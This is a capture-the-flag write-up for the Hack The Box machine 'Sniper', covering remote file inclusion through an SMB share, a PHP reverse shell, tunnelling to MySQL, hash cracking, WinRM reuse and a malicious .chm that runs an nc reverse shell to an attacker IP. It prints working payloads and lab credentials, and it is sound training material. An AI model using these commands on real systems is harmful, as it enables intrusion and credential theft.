# Sniper [HTB](https://app.hackthebox.com/machines/211)
![sniper-01]()


## Recon

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 sniper.htb
```

![ports-02]()


From here I send `nmap` to start probing the found ports for more information:

```bash
nmap -p 80,135,139,445,49667 -sCV sniper.htb -oN nmap.result
```

![nmap-res-03]()

We have the following:

+ An IIS server on port 80.
+ RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ An RPC service on port 49667.


Scrolling through the list, the most interesting entries in my opinion are the IIS and SMB servers. Let's have a look! 


## SMB Port 445

I start examining the SMB server by trying to list out the available shares using a null session, which fails:

```bash
smbclient -N -L \\\\sniper.htb\\
```

![smb-fail-04]()


This is usually an indication that the SMB server is not the way forward. Maybe it will be once we get creds, but at the moment, not much we can do.


Let's check the IIS server! 


## IIS Port 80

Browsing towards `http://sniper.htb/` returns the following page:

![site-06]()


It appears that the company is offering delivery services. The three windows at the top lead to nowhere, but the two windows at the button do link to interesting pages.


+  Our Services

This windows links to `http://sniper.htb/blog/index.php` which looks like this:

![blog-07]()


At the top strip we can three buttons, `Home` redirects back to the main page, `Language` allows you to select one of three languages (English, Spanish & French), which loads a dedicated PHP script for each language. In other words, there is a file inclusion mechanism at play here, which is important so I'll note that. The `Downloads` button has two tabs, one for `Tools` and the other is for `backlink`, though both links lead to the current page.


Reading through the text, we can see several references to the services and "tools" the company offers, though it's unclear at this point what this means exaclty. 


Other then that, not much else to see on this page. 


+ User Portal

This windows links to `http://sniper.htb/user/login.php` which returns a login prompt:

![user-portal-08]()


At the button we also have a link for the registration form at `http://sniper.htb/user/registration.php`. 

Trying to login with some weak creds results in the following page:

![faild-login-09]()


I tried a few other weak credentials like `admin : admin`, `admin : aniper`, etc, all faild. I also tried a few basic SQLi payloads but to no avail. 


Before signing up, I wanted to see if there is more to this site that I'm missing, so I ran a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sniper.htb/FUZZ -e .txt,.html,.conf,.php
```

But this didn't really lead to anything super interesting or novel. I also ran a crwaling scan with [feroxbuster](https://github.com/epi052/feroxbuster), though this didn't help either. While the scans were running, I intercepted some traffic in Burp proxy, to go over the source code and HTTP headers but I didn't find anything super useful.


At this point I decided to create an account and log in:

![construction-10]()


They say that the user portal is "under construction". At first, I wasn't sure where to go from here, so I ran another directory scan againts the `/user`  directory using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sniper.htb/user/FUZZ -e .txt,.html,.php,.config
```

![user-ffuf-11]()


The most interesting entry by far is the `db.php` file, which is probably used to connect to the backend database, but we can see the response from the server is empty.


Then I thought, maybe there is a hidden site? so I ran a subdomain scan using:

```bash
wfuzz -c -f sub-fighter.txt -Z -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u "http://sniper.htb" -H "Host: FUZZ.sniper.htb" --hw 214
```

Unfortunately, this scan came out empty. At this point I got a bit stuck, I wasn't sure what I was missing, so I went back to the previous pages and started analyzing them again. 


Eventually I went back to the language selection feature at `http://sniper.htb/blog/index.php`, as it's the most relevant attack vector I was able to identify. 


If we click on one of the languages and intercept the traffic in Burp, we can see the following request:

![request-12]()


I send this request to Burp's Repeater so I can play around with it. 


At first I tried local file inclusion techniques, for example, I tried to pull the `/user/db.php` script with the following request:

![local-request-13]()


I also tried the following payloads which all faild:

```bash
blog-en.php/../user/db.php
....//user.db.php
..////user.db.php
%252e%252e%252fuser%252fdb.php
....\/user/db.php
../user/db/.php%00
```

But supplying a full path, seems to work:

![full-path-13.5]()



We can try to enumerate useful files on the target in this manner, though it's not the most efficient strategy, so I started looking into remote file inclusion instead. At first, I hosted a python web server on my attack machine, and supplied the URL of my server to the application, this didn't work. 


Instead, because it's a Windows machine, I hosted an SMB server on my attack machine using:

```bash
impacket-smbserver -smb2support s .
```

And sent the UNC path of my server to the application:

![unc-payload-14]()


This stalled the server for a sec, and on my SMB server I got a connection:

![conn-15]()


From here, I downloaded `Ivan-Sincek`'s [php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) and made sure to point the script to my attack machine at the buttom:

![changes-16]()


I start the SMB server once again, and I also start my local listener with:

```bash
rlwrap nc -lnvp 443
```

Then, I send the following payload to the target:

![stalls-17]()


We can see the server stalls, and on my netcat listener I get a shell:

![shell-18]()


## Privilege Escalation

After landing on the box as the `iis apppool` service account, I immediately check for any `Se` privileges:

![se-privs-19]()

We can see we have the `Impersonate` privilege enabled, as it's often the case with Windows service accounts. Since our target machine is a 2019 Windows server:

![sysinfo-20]()


We can use something like [Rouge Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato) to get escalate to `NY AUTHORITY`. But this is not fun, it's too easy.


Instead, I want to go check the `/user/db.php` script from earlier:

![db-script-21]()


We can see the connection string, with the creds to the database. There where also other interesting files in the `user` directory:

![user-dir-22]()


At first, I looked at the two registration files present, as there is an old one and a new one. I copied files over to my attack machine through the SMB server as such:

```cmd
net use \\10.10.14.63\s
copy registration.php \\10.10.14.63\s
copy registration_old123123123847.php \\10.10.14.63\s
```

Then, I compared the two files with `diff`:

![diff-23]()


We can see the new registration file added a few lines of input validation meant to remove the following characters `-$[(_.;&"\` from the supplied username. The genreal registration script looks like this:

![registration-24]()


There is quite a lot of input validation from the application, but after solving the box I've seen people break this filter with a username like this `a<?php echo `whoami` ?>b`. Which can be chained with the LFI vulnerability to get command execution via retrieving the `C:\\windows\temp\sess_<id>` PHP session file:

![rce-24.5]()


This was pretty cool, and there are ways to get a shell from this, but I will leave it for a later run of the box. Let's get back to the privesc. 


In the registration files We also see that the passwords are stored as MD5 hashes. This is worth noting, as it will help us crack any hashes we might find in the database. Which at this point, I started looking for. 


At first, I tried to use the `mysql` command but it wasn't found on the system. So instead I went to the installation directory MySQL at `C:\Program Files\MySQL\MySQL Server 8.0\bin`, and there I found the `mysql.exe` binary. Unfortunately, trying to run it freezes my shell indefinitely. There was also a `mysqldump.exe` binary in this directory, though running it also resutls in a frozen shell.


Instead, I decided to port forward the mysql service to my attack machine and access it locally. I start by listing the open ports on the system using:

```cmd
netstat -ano
```

![netstat-25]()


We can see two new ports that didn't show up in our inital `nmap` scan, which probably means they have been firewalled off. The `mysql` service runs on port `3306`, and port `5985` is actually an HTTP WinRM endpoint. So if we find creds, we can tunnel this port as well to get access to the system. 


I start by forwarding port `3306`, to do that I use my go to which is [chisel](https://github.com/jpillora/chisel). In the latest releases link, I select the `chisel_1.9.1_windows_amd64.gz` package for our target, and downlaod it to my attack machine, I use `gunzip` to extract it and rename it to `cheese.exe`. 


Then, I transfer it over to the `C:\\Windows\Tasks` directory on target using our SMB server, same as before:

```cmd
copy \\10.10.14.63\s\cheese.exe .
```

At this point I start the chisel server on my attack machine with:

```bash
chisel server -p 4545 --reverse
```

And connect from the target to my server and tunnel port 3306:

```cmd
.\cheese.exe client 10.10.14.63:4545 R:3306:127.0.0.1:3306
```

On my server I get the connection and the tunnel is established:

![tunel-26]()


Now I access the SQL server from my attack machine as such:

```bash
mysql -u dbuser -D sniper -p -P 3306
```

![db-27]()


We can see there is one `users` table, let's dump everything from it:

```sql
select * from users;
```

![table-28]()


We can see the `htb` user I created, and another `superuser` user. We know that the hashes are MD5, So I try to crack the superuser's hash using hashcat but it fails:

```bash
hashcat -m 0 -a 0 "6e573c8b25e9168e0c61895d821a3d57" rockyou.txt
```

I try to look up the hash at [crackstation](https://crackstation.net/), but it fails again. So instead, I try [this site](https://md5.gromweb.com/) to "reverse" the hash and I get this:

![crack-29]()


Trying to use the creds `superuser : $uperpassw0rd` to log in to the website works, which validates our finding. 


From here I start thinking about the WinRM endpoint, and how I can login. So I take a look at the available user accounts on the system:

![users-30]()


Could the creds work for `Chris`? 


To connect to the WinRM endpoint, we need to tunnel port 5895 as well. So I terminate my previous tunnel, restart my chisel server on a different port, and connect form the target using:

```cmd
.\cheese.exe client 10.10.14.63:4366 R:5985:127.0.0.1:5985
```

I then try to connect to the WinRM endpoint using the password I scraped from the database, but it fails. but using the password to the MySQL database works:

```bash
evil-winrm -i 127.0.0.1 -u chris -p '36mEAhz/B8xQ~2VM'
```

![chris-31]()


### Chris

After I get a shell as `chris`, I start looking through he's home folder. In the `Downloads` directory I see the following file:

![downloads-32]()

`.chm` files are what is known as [Microsoft Compiled HTML Help](https://en.wikipedia.org/wiki/Microsoft_Compiled_HTML_Help) which is Microsoft's proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools. The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.


The fact we are seeing this file here is not random, but at the moment it's unclear why it's here. If we keep looking around the filesystem we will find an unsual `Docs` directory in the `C:\\` drive, which looks like this:

![docs-33]()


Previously we didn't have access to this directory, but now as `chris` we do. The `note.txt` file reads as such:

![note-34]()


I have a strong suspicion this note wants us to drop a malicious `.chm` file into this directory. 


To to that, we need the `HTLM Help Workshop` software package, as this (old) package includes the compiler needed to make `chm` files. As far as I'm aware, this is not installed on the target. So insatead, I used a Windows 10 VM which had the package installed. If you don't have the package installed, you can find it in [this](https://learn.microsoft.com/en-us/answers/questions/265752/htmlhelp-workshop-download-for-chm-compiler-instal) Microsoft help thread, which will lead you to a link where you can find the software package through the waybackmachine.


Next, we need to grab a copy of `nishang`'s [Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) script so we can generate our malicious payload. I transfer this script over to my windows 10 VM which has the `HTLM Help Workshop` package installed.


Then I compile my malicious `.chm` file a such:

```powershell
. .\Out-CHM.ps1                                                           
out-chm -payload "C:\\Windows\Tasks\nc64.exe 10.10.14.63 9001 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop\"
```

![compile-35]()


This will execute `C:\\Windows\Tasks\nc64.exe` on the target to connect back to my attack machine. So the next step is to transfer `nc64.exe` to the specified path, and our malicious `doc.chm` file over to the `Docs` directory where it is expected. 


To do that, I grab both files to the working directory on my attack machine, and host them up via a python web server

```bash
python3 -m http.server 80
```

Then I download the file from the target using:

```powershell
iwr "http://10.10.14.63/nc64.exe" -OutFile nc64.exe
iwr "http://10.10.14.63/doc.chm" -OutFile doc.chm
copy doc.chm C:\\Docs
```


I start my local listener with:

```bash
rlwrap nc -lnvp 9001
```

And after a few seconds I get an admin shell:

![root-36]()
